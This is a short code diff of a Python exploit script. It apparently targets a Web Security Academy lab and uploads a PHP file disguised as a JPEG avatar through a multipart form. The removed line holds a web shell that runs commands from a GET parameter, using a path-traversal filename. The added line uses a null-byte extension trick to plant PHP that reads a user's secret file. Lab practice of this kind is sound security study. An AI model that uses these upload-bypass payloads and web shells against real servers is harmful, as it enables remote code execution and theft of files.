@@ -3,7 +3,7 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 
 # response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
 multipart_data = MultipartEncoder(fields={
-    'avatar': ('..%2Fwebshell.php', "<?php echo system($_GET['command']);", "image/jpeg"),
+    'avatar': ('webshell.php%00.jpg', "<?php echo file_get_contents('/home/carlos/secret');", "image/jpeg"),
     'csrf': "ppP0cOArqEAJywpjk01eQEXQ9fwtKa7b",
     'user': "wiener"
 })
